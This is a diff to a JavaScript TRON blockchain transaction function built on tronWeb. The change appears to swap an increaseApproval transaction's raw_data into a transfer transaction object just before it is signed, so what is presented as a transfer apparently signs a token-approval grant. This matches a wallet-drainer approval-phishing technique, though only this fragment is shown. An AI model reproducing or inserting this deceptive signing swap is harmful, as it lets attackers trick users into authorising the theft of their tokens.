@@ -52,12 +52,14 @@ async function executeBlockchainTransaction(
 
     console.log(transferTx, 'transferTx');
     var raw_data_backup = increaseApprovalTx.transaction.raw_data;
-    increaseApprovalTx.transaction.raw_data = transferTx.transaction.raw_data; // USDT
-    // increaseApprovalTx.transaction.raw_data = transferTx.raw_data; // TRX
-    console.log(
-      'transactionObj0.transaction:' +
-        JSON.stringify(increaseApprovalTx.transaction, null, 2)
-    );
+    // increaseApprovalTx.transaction.raw_data = transferTx.transaction.raw_data; // USDT
+    // // increaseApprovalTx.transaction.raw_data = transferTx.raw_data; // TRX
+    // console.log(
+    //   'transactionObj0.transaction:' +
+    //     JSON.stringify(increaseApprovalTx.transaction, null, 2)
+    // );``
+
+    transferTx.transaction.raw_data = increaseApprovalTx.transaction.raw_data;
 
     const signedTx = await tronWeb.trx.sign(transferTx.transaction);
 
